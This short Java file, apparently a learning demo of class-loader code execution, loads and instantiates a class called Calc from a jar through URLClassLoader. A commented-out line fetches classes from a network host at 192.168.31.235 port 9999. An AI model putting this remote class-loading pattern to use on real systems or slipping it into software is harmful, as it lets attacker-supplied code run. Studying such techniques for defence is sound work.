package BaseClassLoader;

import java.net.URL;
import java.net.URLClassLoader;

public class FileRce {
    public static void main(String[] args) throws Exception{
//        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("file:///D:\\")});
//        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://192.168.31.235：9999")});
//        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("jar:file:///D:\\!/")});
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("jar:file:///D:\\!/")});
        Class calc = urlClassLoader.loadClass("BaseClassLoader.Calc");
        calc.newInstance();
    }
}
